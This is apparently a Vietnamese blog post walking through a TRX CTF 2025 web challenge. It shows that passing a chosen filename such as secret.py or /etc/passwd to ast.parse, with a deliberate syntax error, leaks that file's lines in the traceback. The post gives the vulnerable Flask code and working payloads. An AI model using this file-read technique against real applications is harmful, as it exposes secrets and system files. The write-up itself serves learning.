title: Đọc file tùy ý với ast.parse
date: 2025-02-26
tags: ast, Python, security,
category: pymi.vn
slug: ast_parse
authors: Pymier0
description: ast.parse chỉ parse code thành AST, liệu có đọc được file?

Bài trước [biến nhỏ hơn thành lớn hơn với ast]({filename}/ast_intro.md) giới thiệu sử dụng AST để biến code thành tree, giúp xử lý code theo kiến trúc (thay vì text).

Bài viết này có liên quan tới module `ast`, nhưng trong một hoàn cảnh khác... liên quan tới bảo mật.

### Đề bài - web TRX CTF 2025
Giải [TRX CTF 2025](https://ctftime.org/event/2654) có đề bài cho 1 trang web như sau:

```py
import ast
import traceback
from flask import Flask, render_template, request

app = Flask(__name__)

@app.get("/")
def home():
    return render_template("index.html")

@app.post("/check")
def check():
    try:
        ast.parse(**request.json)
        return {"status": True, "error": None}
    except Exception:
        return {"status": False, "error": traceback.format_exc()}

if __name__ == '__main__':
    app.run(debug=True)
```

một website flask đơn giản, nhận đầu vào tùy ý của người dùng và chạy `ast.parse`.
Một file `secret.py` nằm cùng thư mục, chứa flag

```py

def main():
    print("Here's the flag: ")
    print(FLAG)

FLAG = "TRX{fake_flag_for_testing}"

main()
```

Mục tiêu là đọc giá trị của `FLAG`.

### Đọc tài liệu ast.parse

```
Python 3.10.12 (main, Feb  4 2025, 14:57:36) [GCC 11.4.0] on linux
>>> import ast
>>> print(ast.parse.__doc__)

Parse the source into an AST node.
Equivalent to compile(source, filename, mode, PyCF_ONLY_AST).
Pass type_comments=True to get back type comments where the syntax allows.
```


Tài liệu không ghi gì hơn là đá sang đọc doc của builtin function compile:

```py
>>> print(compile.__doc__)
Compile source into a code object that can be executed by exec() or eval().

The source code may represent a Python module, statement or expression.
The filename will be used for run-time error messages.
The mode must be 'exec' to compile a module, 'single' to compile a
single (interactive) statement, or 'eval' to compile an expression.
The flags argument, if present, controls which future statements influence
the compilation of the code.
The dont_inherit argument, if true, stops the compilation inheriting
the effects of any future statements in effect in the code calling
compile; if absent or false these statements do influence the compilation,
in addition to any features explicitly specified.
```

**The source code may represent a Python module, statement or expression.  The filename will be used for run-time error messages.**

filename được dùng cho run-time error messages, nhưng không rõ ràng là dùng thế nào.
Trên doc trang chủ:

```
ast.parse(source, filename='<unknown>', mode='exec', *, type_comments=False, feature_version=None)¶
```
filename mặc định có giá trị là '<unknown>'.
Thử vài ví dụ:

```py
>>> ast.parse(open(ast.__file__).read(), '<unknown>')
<ast.Module object at 0x752c51f9d7e0>
>>> ast.parse('for i in range(10):\n    print(i)', '<unknown>')
<ast.Module object at 0x752c520ebcd0>
>>> ast.parse('for i in range(10):\n    print(i', '<unknown>')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.10/ast.py", line 50, in parse
    return compile(source, filename, mode, flags,
  File "<unknown>", line 2
    print(i
         ^
SyntaxError: '(' was never closed
```
có thể thấy khi có SyntaxError, màn hình sẽ hiện ra dòng code bị lỗi syntax, và file '<unknown>' không đóng vai trò gì cả.

Nhưng khi gán filename="secret.py", dòng số 2 của file này lại hiện ra:

```py
>>> ast.parse("for i in range(10):\n    print(i", "secret.py")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.10/ast.py", line 50, in parse
    return compile(source, filename, mode, flags,
  File "secret.py", line 2
    def main():
             ^
SyntaxError: '(' was never closed
```

Vậy chỉ cần viết code xuống đến dòng thứ 6 rồi viết syntax error sẽ hiện ra FLAG:

```py
>>> ast.parse("\n\n\n\n\ndef", "secret.py")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.10/ast.py", line 50, in parse
    return compile(source, filename, mode, flags,
  File "secret.py", line 6
    FLAG = "TRX{fake_flag_for_testing}"
       ^
SyntaxError: invalid syntax
```

Thậm chí có thể đọc file tùy ý, không cần phải code python:
```py
>>> ast.parse("def", "/etc/passwd")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.10/ast.py", line 50, in parse
    return compile(source, filename, mode, flags,
  File "/etc/passwd", line 1
    root:x:0:0:root:/root:/bin/bash
       ^
SyntaxError: invalid syntax
```

Đọc code CPython, lần theo function [compile](https://github.com/python/cpython/blob/43a2a372ba071c4ebb1071240da2b852c29d77fb/Python/bltinmodule.c#L759-L855) sẽ tháy

```
PyObject *
_PyErr_ProgramDecodedTextObject(PyObject *filename, int lineno, const char* encoding)
{
...
    FILE *fp = _Py_fopen_obj(filename, "r" PY_STDIOTEXTMODE);
```
trong [errors.c](https://github.com/python/cpython/blob/43a2a372ba071c4ebb1071240da2b852c29d77fb/Python/errors.c#L1946)


### Góc AI
Vác luôn đề hỏi các AI xịn nhất ngày nay xem:

[Claude.ai](https://claude.ai/chat/553d2e6f-62f4-4048-8480-f2e1367426f6)

> Given the code shown, I don't see a direct path to reading the FLAG from secret.py through the ast.parse() function alone. The function's parameters don't provide functionality to import or read other files in a way that would return their contents through the error messages.

sau một hồi đoán mò lung tung đủ thứ. ChatGPT 4o-mini dù phát hiện đoạn code có thể bị DOS attack, nhưng cũng nhầm lẫn tương tự và không thể tìm được cách tấn công.

Chờ bạn đọc chăm chỉ test với DeepSeek R1.

### Kết luận
`ast.parse` có thể đọc file tùy ý.

Hết.

HVN at <http://pymi.vn> and <https://www.familug.org>.

[Ủng hộ tác giả 🍺](https://www.familug.org/p/ung-ho.html)
